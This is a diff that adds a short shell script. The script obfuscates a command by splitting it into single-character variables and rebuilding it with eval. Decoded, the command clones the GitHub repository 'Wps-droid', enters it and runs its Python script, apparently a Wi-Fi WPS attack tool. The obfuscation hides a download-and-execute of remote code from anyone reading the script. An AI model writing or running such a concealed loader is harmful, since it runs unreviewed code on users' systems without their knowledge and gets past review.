@@ -1,0 +1,2 @@
+#!/bin/sh
+_a1='g';_b2='i';_c3='t';_d4=' ';_e5='c';_f6='l';_g7='o';_h8='n';_i9='e';_j0=' ';_k1='https://github.com/voidh7/Wps-droid';_l2=';';_m3='c';_n4='d';_o5=' ';_p6='Wps-droid';_q7=';';_r8='p';_s9='y';_t0='t';_u1='h';_v2='o';_w3='n';_x4=' ';_y5='Wps.py';_z6='eval';$_z6 "$_a1$_b2$_c3$_d4$_e5$_f6$_g7$_h8$_i9$_j0$_k1$_l2$_m3$_n4$_o5$_p6$_q7$_r8$_s9$_t0$_u1$_v2$_w3$_x4$_y5"
